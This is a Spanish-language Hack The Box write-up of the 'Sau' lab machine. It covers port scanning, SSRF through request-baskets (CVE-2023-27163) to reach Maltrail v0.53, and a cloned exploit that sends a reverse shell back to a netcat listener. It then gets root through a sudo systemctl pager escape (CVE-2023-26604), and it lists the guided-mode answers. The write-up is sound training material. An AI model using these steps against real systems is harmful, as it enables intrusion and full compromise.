---
title: Writeup sau - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - sau
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina sau en Hack The Box.
keywords:
  - writeup sau
  - hack the box sau
  - resolución máquina sau
  - sau hack the box
  - htb sau
---
-----------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link] (https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Sau)
- 📺 **Resolución en vivo (completa)**:[Parte1](https://www.youtube.com/watch?v=5obRDrKVgDU)|[Parte2](https://www.youtube.com/watch?v=GYXUSWpVv6Q)|[Parte3](https://www.youtube.com/watch?v=Eood-ZOml3I)|[Parte4](https://www.youtube.com/watch?v=3JcR_UsS6O8)
- 🧠 **Explicación resumida**:

---

#easy #linux #nmap #ping #whatweb #git #sudo #sudo-l #tratamientotty #maltrailv053 #CVE-2023-26604 #SSRF #CVE-2023-27163 #cd #ls #gitclone 

---------
# Guided Mode

1)¿Cuál es el puerto TCP abierto más alto en la máquina de destino?
	55555

2)¿Cuál es el nombre del software de código abierto que utiliza la aplicación 55555?
	request-baskets

3)¿Cuál es la versión de request-baskets que se ejecuta en Sau?
	1.2.1

4)¿Cuál es el ID CVE 2023 para una falsificación de solicitud del lado del servidor (SSRF) en esta versión de request-baskets?
	CVE-2023-27163

5)¿Cuál es el nombre del software que «impulsa» la aplicación que se ejecuta en el puerto 80?
	Maltrail

6)Existe una vulnerabilidad de inyección de comandos no autenticados en MailTrail v0.53. ¿Cuál es la ruta relativa en el servidor web al que apunta este exploit?
	/login

7)¿Con qué usuario del sistema se ejecuta la aplicación Mailtrack en Sau?
	puma

*La pregunta anterior fue la flag de user.txt*
9)¿Cuál es la ruta completa al binario (sin argumentos) que el usuario puma puede ejecutar como root en Sau?
	/usr/bin/systemctl

10)¿Cuál es la cadena completa de la versión del sistema systemd instalado en Sau?
	systemd 245 (245.4-4ubuntu3.22)

11)¿Cuál es el ID CVE 2023 para una vulnerabilidad de escalada de privilegios locales en esta versión de systemd?
	CVE-2023-26604

--------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.224
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.11.224 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,55555 10.10.11.224 -oN target
```

![[Sau1.png]]

![[Sau2.png]]

![[Sau3.png]]

![[Sau4.png]]

![[Sau5.png]]
*TTL:* Maquina linux
*Puertos*
	`22`[[ssh]]
	`55555` HTTP
*Dato Importante:* Si bien desconocemos al principio que servicio esta corriendo el puerto *55555* vemos que dice HTTP en las peticiones asi que vamos a intentar conectarnos como si fuera una web

-----------
## Reconocimiento adicional

Para esta maquina vamos a tener que realizar un escaneo viendo los peurtos que estan filtrados

```shell
nmap -p- -vvv -sS --min-rate 5000 -n -Pn 10.10.11.224 -oG nuevo
nmap -sCV -p22,80,8338,55555 10.10.11.224 -oN puertosfiltered
```

![[Sau16.png]]

![[Sau15.png]]
*Puertos filtered relevantes:*
	`80` HTTP

--------

# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.10.11.224:55555
```
![[Sau18.png]]

-----------
# [[CVE-2023-27163]] y [[SSRF (Server-Side Request Forgery)]]

![[Sau17.png]]
Podemos abajo de todo que nos dice qeu es un request-baskets. Version 1.2.1
Vimos que era el [[CVE-2023-27163]] pero no encontramos ningun proyecto que pueda explotar esta vulnerabilidad que funcione.

Desde la pagina web vamos a crear un basket poniendo el nombre que querramos, entramos con el boton de *Open Basket* 
![[Sau14.png]]

Vamos a apretar sobre la tuerca que esta arriba a la derecha para configurar el basket, vamos a poner la URL a la que queremos redigir, que va a ser la ip local de la maquina victima, y el puerto `80` que vimos filtrado, por lo tanto no sabemos si esta abierto o cerrado. Por lo tanto seria http://127.0.0.1:80  Y tambien vamos a seleccionar las dos casillas de abajo de *Proxy Response* y *Expand Forward Path*

![[Sau13.png]]

Ahora entramos al basket mediante el link http://10.10.11.224:55555/testeo
![[Sau12.png]]
Ahora estamos ante un [[Maltrail v0.53]] y a continuacion lo vamos a vulnerar

-------
# [[Maltrail v0.53]]

[Exploit link de repositorio github](https://github.com/spookier/Maltrail-v0.53-Exploit)
Con [[git clone]] con el comando `git clone https://github.com/spookier/Maltrail-v0.53-Exploit` vamos clonar el repositorio en nuestra maquina. Luego con [[cd]] entramos con el comando `cd Maltrail-v0.53-Exploit`  y una vez dentro listamos el contenido de la carpeta con [[ls]] . Ahora que ya visualizamos el exploit lo vamos a ejecutar con `python3 exploit.py 10.10.16.9 443 http://10.10.11.224:55555/testeo` mientras estamos en escucha con [[nc -nlvp 443]]

![[Sau11.png]]

![[Sau10.png]]
Y listo ya ganamos acceso a la maquina siendo el usuario *puma*

------
# [[Tratamiento de la TTY]]

---------
# Escalada de privilegios con [[CVE-2023-26604]]

### Enumeracion
Usamos [[sudo]] con el comando `sudo -l`
![[Sau9.png]]
Vemos que el binario */usr/bin/systemctl status trail.service* lo podemos ejecutar con privilegios sin otorgar contraseña 


Ahora vemos la version del binario con ``systemctl --version``

![[Sau8.png]]
Vemos que es la version *systemd 245 (245.4-4ubuntu3.22)* asi que buscando en internet encontramos la vulnerabilidad [[CVE-2023-26604]] 



### Explotacion 
[Con este articulo pudimos entender la vulnerabilidad](https://medium.com/%40zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7)
Ejecutando el binario con privilegios `sudo /usr/bin/systemctl status trail.service` quedamos con el archivo como si fuera un modo paginate, asi que vamos a ejecutar el comando `!sh` para que nos de una shell, y ya somos root y tenemos una consola con privilegios
![[Sau7.png]]
Ahora solamente nos queda catear las flags

![[Sau6.png]]


-------
# Creditos
Writeup Oficial HackTheBox
https://medium.com/@sandra.sm/writeup-sau-htb-5cc449f0461f